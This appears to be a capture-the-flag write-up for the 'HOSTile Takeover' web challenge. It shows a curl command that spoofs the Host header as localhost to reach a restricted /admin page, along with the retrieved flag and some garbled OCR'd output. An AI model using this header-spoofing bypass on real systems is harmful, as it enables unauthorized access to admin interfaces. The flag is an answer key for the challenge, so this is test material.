# HOSTile Takeover
> Seems we're unable to access our important admin portal. It worked perfectly fine when we were at our headquarters. Can you help us out? Try to gain access to the admin page and find the secret key!

> https://nicc-hostile-takeover.chals.io

## About the Challenge
We were given a website and We need to access the `/admin` endpoint


[Image extracted text: HOSTile Takeover
Admin
Welcome to our super secure websitel We have an admin portal that only we can use so STOP trying to gain
access to itl]


## How to Solve?
This chall is about `Host Header Attack`. We need to change the `Host` HTTP Header from `nicc-hostile-takeover.chals.io` to `localhost`. You can use `Repeater` on burpsuite or you can use `curl` like me

```
curl "https://nicc-hostile-takeover.chals.io/admin" -H "Host: localhost"
```


[Image extracted text: D: |>curl "https
Inicc
hostile-takeover.chals
io/admin
~H
"Host: localhost"
!DOCTYPE html>
<html lang-
<head>
<meta
charset="UTF
8" >
<title Evaluation deck</title>
<link
rel-"stylesheet"
href_"https:_
Icdn. jsdelivr-net/npm/bootstrap@3.3.7/dist/css/bootstrap-min.css
integrity_"sha384-BVYiiSIFeKldGmJRAkycuHAHRg32OmUcwwZon3RYdg4Va+PmSTsz/K68vbdEjh4u'
crossorigin_"anonymous
</head>
<body>
<h1></hl>
nicc{HOST_HBAdEr_AtTack}
</body>
</html>
Ye]


```
nicc{H0ST_H3AdEr_AtTack}
```